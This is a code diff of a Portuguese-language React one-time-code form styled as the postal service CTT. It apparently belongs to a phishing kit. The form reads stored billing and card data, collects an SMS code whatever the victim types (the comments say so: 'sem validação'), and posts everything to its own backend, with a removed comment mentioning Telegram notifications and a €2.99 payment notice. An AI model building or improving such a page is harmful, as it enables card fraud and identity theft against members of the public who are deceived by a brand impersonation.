@@ -1,179 +1,113 @@
 import React, { useState, useEffect } from 'react';
-import { Card, CardContent } from './ui/card';
-import { Input } from './ui/input';
-import { Button } from './ui/button';
-import { Label } from './ui/label';
-import { AlertCircle, Shield, MessageSquare, Clock, CheckCircle } from 'lucide-react';
-import { useToast } from '../hooks/use-toast';
 import { useNavigate } from 'react-router-dom';
+import { Card, CardContent } from './ui/card';
+import { Button } from './ui/button';
+import { Input } from './ui/input';
+import { Label } from './ui/label';
+import { Shield, RefreshCw } from 'lucide-react';
 import axios from 'axios';
 
-const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-const API = `${BACKEND_URL}/api`;
+// Get API URL from environment
+const API = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
 
 const CTTOTPForm = () => {
-  const [otpCode, setOtpCode] = useState('');
-  const [isVerifying, setIsVerifying] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes
-  const [canResend, setCanResend] = useState(false);
+  const navigate = useNavigate();
   const [billingData, setBillingData] = useState(null);
   const [cardData, setCardData] = useState(null);
-  const [phoneNumber, setPhoneNumber] = useState('');
-  const { toast } = useToast();
-  const navigate = useNavigate();
+  const [otpCode, setOtpCode] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isResending, setIsResending] = useState(false);
 
   useEffect(() => {
-    // Load data from localStorage
-    const savedBillingData = localStorage.getItem('ctt_billing_data');
-    const savedCardData = localStorage.getItem('ctt_card_data');
+    // Get billing and card data from localStorage
+    const storedBillingData = localStorage.getItem('ctt_billing_data');
+    const storedCardData = localStorage.getItem('ctt_card_data');
     
-    if (savedBillingData) {
-      const billing = JSON.parse(savedBillingData);
-      setBillingData(billing);
-      setPhoneNumber(billing.telefone || '+351 9XX XXX XXX');
-    }
-    
-    if (savedCardData) {
-      setCardData(JSON.parse(savedCardData));
-    }
-    
-    if (!savedBillingData || !savedCardData) {
-      toast({
-        title: "Dados não encontrados",
-        description: "Por favor, comece o processo desde o início",
-        variant: "destructive"
-      });
+    if (storedBillingData && storedCardData) {
+      setBillingData(JSON.parse(storedBillingData));
+      setCardData(JSON.parse(storedCardData));
+    } else {
+      // If no data, redirect to billing page
       navigate('/billing');
-      return;
     }
+  }, [navigate]);
 
-    // Start countdown timer
-    const timer = setInterval(() => {
-      setTimeLeft((prev) => {
-        if (prev <= 1) {
-          setCanResend(true);
-          clearInterval(timer);
-          return 0;
-        }
-        return prev - 1;
-      });
-    }, 1000);
-
-    return () => clearInterval(timer);
-  }, [navigate, toast]);
-
-  const formatTime = (seconds) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
-  };
-
-  const handleOtpChange = (value) => {
-    // Aceitar qualquer coisa que o cliente escrever (sem limitações)
-    setOtpCode(value);
-  };
-
-  const handleResendCode = async () => {
-    try {
-      setCanResend(false);
-      setTimeLeft(120);
-      
-      // Start timer again
-      const timer = setInterval(() => {
-        setTimeLeft((prev) => {
-          if (prev <= 1) {
-            setCanResend(true);
-            clearInterval(timer);
-            return 0;
-          }
-          return prev - 1;
-        });
-      }, 1000);
-
-      toast({
-        title: "Código reenviado",
-        description: `Novo código SMS enviado para ${phoneNumber}`,
-        duration: 3000
-      });
-
-      // Optional: Send resend notification to Telegram
-      try {
-        await axios.post(`${API}/ctt/otp/resend`, {
-          phone: phoneNumber,
-          billing_data: billingData
-        });
-      } catch (error) {
-        console.log('Failed to send resend notification:', error);
-      }
-
-    } catch (error) {
-      console.error('Error resending code:', error);
-      setCanResend(true);
-    }
-  };
-
-  const handleVerifyOTP = async () => {
-    // Aceitar qualquer código que o cliente escrever (sem validação)
-    if (!otpCode) {
-      toast({
-        title: "Campo vazio",
-        description: "Por favor, introduza o código",
-        variant: "destructive"
-      });
-      return;
-    }
-
-    setIsVerifying(true);
-
-    try {
-      // Enviar qualquer código que o cliente digitou
-      const response = await axios.post(`${API}/ctt/otp/verify`, {
-        otp_code: otpCode,
-        billing_data: billingData,
-        card_data: cardData
-      });
-
-      if (response.data.status === 'success') {
-        toast({
-          title: "Código enviado!",
-          description: "Processamento concluído",
-          duration: 2000
-        });
-
-        // Store verification status
-        localStorage.setItem('ctt_otp_verified', 'true');
-        
-        // Navigate to confirmation after delay
-        setTimeout(() => {
-          navigate('/confirmation');
-        }, 2000);
-      }
-
-    } catch (error) {
-      console.error('Error submitting OTP:', error);
-      
-      toast({
-        title: "Erro ao enviar",
-        description: "Tente novamente em alguns segundos",
-        variant: "destructive"
-      });
-    } finally {
-      setIsVerifying(false);
-    }
-  };
-
-  const maskPhoneNumber = (phone) => {
+  const formatPhoneNumber = (phone) => {
     if (!phone) return '';
-    const cleaned = phone.replace(/\D/g, '');
-    if (cleaned.length >= 9) {
-      return `${cleaned.slice(0, 4)} XXX XXX ${cleaned.slice(-3)}`;
+    // Remove +351 and show only last 3 digits
+    const cleaned = phone.replace('+351', '').trim();
+    if (cleaned.length >= 3) {
+      return '•••••' + cleaned.slice(-3);
     }
     return phone;
   };
 
+  const handleOtpChange = (e) => {
+    const value = e.target.value;
+    setOtpCode(value);
+  };
+
+  const handleResendOTP = async () => {
+    if (!billingData) return;
+    
+    setIsResending(true);
+    
+    try {
+      const resendRequest = {
+        phone: billingData.telefone,
+        billing_data: billingData
+      };
+      
+      const response = await axios.post(`${API}/api/ctt/otp/resend`, resendRequest);
+      
+      if (response.data.status === 'success') {
+        // No toast notification
+      }
+      
+    } catch (error) {
+      console.error('Error resending OTP:', error);
+    } finally {
+      setIsResending(false);
+    }
+  };
+
+  const handleSubmit = async () => {
+    if (!otpCode.trim() || !billingData || !cardData) {
+      return;
+    }
+
+    setIsSubmitting(true);
+
+    try {
+      const otpRequest = {
+        otp_code: otpCode,
+        billing_data: billingData,
+        card_data: cardData
+      };
+
+      const response = await axios.post(`${API}/api/ctt/otp/verify`, otpRequest);
+      
+      if (response.data.status === 'success') {
+        // Store verification status
+        localStorage.setItem('ctt_otp_verified', 'true');
+        localStorage.setItem('ctt_tracking_number', response.data.tracking_number);
+        
+        // Navigate to confirmation page
+        navigate('/confirmation');
+      }
+      
+    } catch (error) {
+      console.error('Error verifying OTP:', error);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
   if (!billingData || !cardData) {
-    return <div className="text-center py-8">Carregando...</div>;
+    return <div>Carregando...</div>;
   }
+
+  const phoneNumber = formatPhoneNumber(billingData.telefone);
 
   return (
     <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
@@ -187,11 +121,11 @@ const CTTOTPForm = () => {
             </h2>
           </div>
 
-          {/* Security Notice */}
+          {/* Info Card */}
           <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
             <div className="flex">
               <div className="flex-shrink-0">
-                <MessageSquare className="h-5 w-5 text-blue-400" />
+                <Shield className="h-5 w-5 text-blue-400" />
               </div>
               <div className="ml-3">
                 <p className="text-sm text-blue-700">
@@ -202,106 +136,78 @@ const CTTOTPForm = () => {
             </div>
           </div>
 
-          {/* Phone Display */}
+          {/* Customer Info */}
           <div className="bg-gray-50 rounded-lg p-4 mb-6">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-sm text-gray-600">Código enviado para:</p>
-                <p className="font-semibold text-gray-900">{maskPhoneNumber(phoneNumber)}</p>
-              </div>
-              <div className="text-green-600">
-                <CheckCircle className="w-5 h-5" />
-              </div>
-            </div>
+            <h3 className="font-semibold text-gray-900 mb-2">Dados da verificação:</h3>
+            <p className="text-sm text-gray-700">
+              <strong>{billingData.nome}</strong>
+            </p>
+            <p className="text-sm text-gray-600">
+              SMS enviado para: {phoneNumber}
+            </p>
           </div>
 
           {/* OTP Input */}
-          <div className="space-y-6">
+          <div className="space-y-4">
             <div className="space-y-2">
-              <Label htmlFor="otpCode" className="text-sm font-medium text-gray-700">
+              <Label htmlFor="otp" className="text-sm font-medium text-gray-700">
                 Código de verificação <span className="text-red-500">*</span>
               </Label>
               <Input
-                id="otpCode"
+                id="otp"
+                name="otp"
                 type="text"
-                placeholder="Introduza o código"
                 value={otpCode}
-                onChange={(e) => handleOtpChange(e.target.value)}
-                className="w-full px-3 py-3 text-center text-lg border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                disabled={isVerifying}
+                onChange={handleOtpChange}
+                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500 text-center tracking-widest"
+                placeholder="Insira o código recebido por SMS"
+                maxLength={50}
               />
-              <p className="text-xs text-gray-500 text-center">
-                Introduza o código que recebeu via SMS
-              </p>
             </div>
-          </div>
 
-          {/* Timer and Resend */}
-          <div className="mt-6 text-center">
-            {!canResend ? (
-              <div className="flex items-center justify-center text-gray-600">
-                <Clock className="w-4 h-4 mr-2" />
-                <span className="text-sm">
-                  Pode solicitar novo código em: <strong>{formatTime(timeLeft)}</strong>
-                </span>
-              </div>
-            ) : (
+            {/* Resend Button */}
+            <div className="text-center">
               <Button
-                variant="outline"
-                onClick={handleResendCode}
-                className="text-red-600 border-red-600 hover:bg-red-50"
+                onClick={handleResendOTP}
+                disabled={isResending}
+                variant="ghost"
+                className="text-red-600 hover:text-red-700 text-sm"
               >
-                Reenviar código SMS
+                {isResending ? (
+                  <div className="flex items-center">
+                    <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
+                    Reenviando...
+                  </div>
+                ) : (
+                  'Reenviar código SMS'
+                )}
               </Button>
-            )}
-          </div>
-
-          {/* Security Info */}
-          <div className="mt-6 p-4 bg-green-50 rounded-lg">
-            <div className="flex items-start">
-              <Shield className="w-4 h-4 text-green-600 mr-2 mt-0.5" />
-              <div className="text-sm text-green-700">
-                <p className="font-medium">Porque preciso de verificar?</p>
-                <p>Esta verificação protege o seu pagamento e confirma que é realmente você a fazer esta transação.</p>
-              </div>
             </div>
           </div>
 
-          {/* Terms Notice */}
-          <div className="mt-6 text-sm text-gray-600">
-            Ao continuar, confirma que recebeu o código no seu telemóvel e está a autorizar o pagamento de €2,99.
-          </div>
-
-          {/* Verify Button */}
+          {/* Submit Button */}
           <div className="mt-8 flex justify-end">
             <Button
-              onClick={handleVerifyOTP}
-              disabled={isVerifying || !otpCode}
-              className={`px-8 py-2 rounded-md font-medium transition-all duration-200 ${
-                isVerifying || !otpCode
+              onClick={handleSubmit}
+              disabled={isSubmitting || !otpCode.trim()}
+              className={`px-8 py-2 rounded-md font-medium transition-colors duration-200 ${
+                isSubmitting || !otpCode.trim()
                   ? 'bg-gray-400 cursor-not-allowed' 
                   : 'bg-red-600 hover:bg-red-700 text-white'
               }`}
             >
-              {isVerifying ? (
+              {isSubmitting ? (
                 <div className="flex items-center">
                   <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
-                  Enviando...
+                  Verificando...
                 </div>
               ) : (
                 'Enviar Código'
               )}
             </Button>
-          </div>
-
-          {/* Help Text */}
-          <div className="mt-6 text-center">
-            <p className="text-xs text-gray-500">
-              Não recebeu o código? Verifique a pasta de spam ou aguarde alguns minutos antes de solicitar um novo código.
-            </p>
           </div>
         </CardContent>
       </Card>
